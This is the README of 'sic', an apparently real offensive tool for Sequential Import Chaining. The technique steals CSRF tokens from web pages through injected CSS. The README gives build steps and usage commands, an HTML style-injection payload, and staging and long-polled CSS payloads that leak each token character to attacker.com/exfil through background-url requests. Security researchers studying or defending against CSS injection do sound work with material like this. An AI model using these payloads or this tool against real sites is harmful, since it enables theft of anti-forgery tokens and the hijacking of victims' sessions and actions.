# Sequential Import Chaining

Typical CSS injection requires an attacker to load the context a number of times to exfiltrate sensitive tokens from a page. Usually the vector for this is via iframing which isn't always possible, especially if the target is using `x-frame-options: deny` or `x-frame-options: sameorigin`. This can be further complicated if the victim needs to interact with the target to trigger the injection (perhaps due to dynamic behavior on the page).

Sequential import chaining is a technique that enable a quicker, easier, token exfiltration even in the cases where framing isn't possible or the dynamic context is only occasionally realized.

### Blog Post
I wrote a blog post on this. Read about it [here!](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)

## Prerequisites for Attack

This attack only works if the attacker at least one of these: 

* Style tag injection (HTML injection, for example)
* Control of CSS at the top of a style tag.

The first case is probably more likely and will work even if filtered through vanilla DOM Purify.

## Building

1. Install RustUp (https://rustup.rs/ - `curl https://sh.rustup.rs -sSf | sh`)
2. Install the nightly (`rustup install nightly`)
3. Default to nightly (`rustup default nightly`)
4. Build with cargo (`cargo build --release`)

You will find the built binary at `./target/release/sic`

## Usage
`sic` has documentation on the available flags when calling `sic -h` but the following is information for general usage.

* `-p` will set the lower port that `sic` will operate on. By default this is 3000. `sic` will also listen on port `port + 1` (by default 3001) to circumvent a technical limitation in most browsers regarding open connection limits.
* `--ph` sets the hostname that the "polling host" will operate on. This can either be the lower or higher operating port, though it's traditionally the lower port. Defaults to `http://localhost:3000`. This _must_ be different than `--ch`
* `--ch` similar to `--ph` but this sets the "callback host" where tokens are sent. Defaults to `http://localhost:3001`. This _must_ be different than `--ph`.
* `-t` specifies the template file used to generate the token exfiltration payloads.
* `--charset` specifies the set of characters that may exist in the target token. Defaults to alphanumerics (`abc...890`).

A standard usage of this tool may look like the following:
```
./sic -p 3000 --ph "http://localhost:3000" --ch "http://localhost:3001" -t my_template_file
```

And the HTML injection payload you might use would look like:
```
<style>@import url(http://localhost:3000/staging?len=32);</style>
```

The `len` parameter specifies how long the token is. This is necessary for `sic` to generate the appropriate number of `/polling` responses. If unknown, it's safe to use a value higher than the total number of chars in the token.

### Advanced Logs
`sic` will print minimal logs whenever it receives any token information; however, if you want more detailed information advanced logging is supported through an environment variable `RUST_LOG`.

```
RUST_LOG=info ./sic -t my_template_file
```

### Templates
The templating system is very straightforward for `sic`. There are two actual templates (probably better understood as 'placeholders'):
* `{{:token:}}` - This is the current token that we're attempting to test for. This would be the `xyz` in `input[name=csrf][value^=xyz]{...}`
* `{{:callback:}}` - This is the address that you want the browser to reach out to when a token is determined. This will be the callback host (`--ch`). All the information `sic` needs to understand what happened client-side will be in this url.

An example template file might look like this:
```
input[name=csrf][value^={{:token:}}] { background: url({{:callback:}}); }
```

`sic` will automatically generate all of the payloads required for your attack and make sure it's pointing to the right callback urls.

### HTTPS
HTTPS is not directly support via `sic`; however, it's possible to use a tool like nginx to set up a reverse proxy in front of `sic`. An example configuration is found in the [example nginx config](/example_nginx.conf) file thoughtfully crafted up by [nbk_2000](https://twitter.com/nbk_2000).

After nginx is configured, you would run `sic` using a command similar to the following:

```
./sic -p 3000 --ph "https://a.attacker.com" --ch "https://b.attacker.com" -t template_file
```

Note that the ports on `--ph` and `--ch` match up with the ports nginx is serving and not `sic`. 

## Technique Description

For a better story and additional information, please see my blog post on [Sequential Import Chaining here](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b).

The idea behind CSS injection token exfiltration is simple: You need the browser to evaluate your malicious css once, send an outbound request with the next learned token, and repeat. 

Obviously the "repeat" part is normally done using a full frame reload (iframing, or tabs... blah).

However, we don't actually need to reload the frame to get the browser to reevaluate *new* CSS.

Sequential Import Chaining uses 3 easy steps to trick some browser into performing multiple evaluations:

1. Inject an `@import` rule to the staging payload 
2. Staging payload uses `@import` to begin long-polling for malicious payloads
3. Payloads cause browser to call out using `background-img: url(...)` causing the next long-polled `@import` rule to be generated and returned to the browser.

## Example

Here's an example of what these might look like:

### Payload
`<style>@import url(http://attacker.com/staging?len=32);</style>`

### Staging
```
@import url(http://attacker.com/lp?len=0);
@import url(http://attacker.com/lp?len=1);
@import url(http://attacker.com/lp?len=2);
...
@import url(http://attacker.com/lp?len=31); // in the case of a 32 char long token
```

### Long-polled Payload (length 0)
This is a unique, configurable template in `sic` because this part is very context specific to the vulnerable application.
```
input[name=xsrf][value^=a] { background: url(http://attacker.com/exfil?t=a); }
input[name=xsrf][value^=b] { background: url(http://attacker.com/exfil?t=b); }
input[name=xsrf][value^=c] { background: url(http://attacker.com/exfil?t=c); }
...
input[name=xsrf][value^=Z] { background: url(http://attacker.com/exfil?t=Z); }
```

After the browser calls out to `http://attacker.com/exfil?t=<first char of token>`, `sic` records the token, generate the next long-polled payload, and return a response for `http://attacaker.com/lp?len=1`. 

### Long-polled Payload (length 1 - given `s` as first char)
```
input[name=xsrf][value^=sa] { background: url(http://attacker.com/exfil?t=sa); }
input[name=xsrf][value^=sb] { background: url(http://attacker.com/exfil?t=sb); }
input[name=xsrf][value^=sc] { background: url(http://attacker.com/exfil?t=sc); }
...
input[name=xsrf][value^=sZ] { background: url(http://attacker.com/exfil?t=sZ); }
```

This repeats until no more long-polled connections are open.

----

Shoutout to the following hackers for help in one way or another.

* [0xacb](https://twitter.com/0xACB)
* [cache-money](https://twitter.com/itscachemoney)
* [Shubs](https://twitter.com/infosec_au)
* [Sean](https://twitter.com/seanyeoh)
* [Ruby](https://twitter.com/_ruby)
* [vila](https://twitter.com/cgvwzq)
* [nbk_2000](https://twitter.com/nbk_2000)
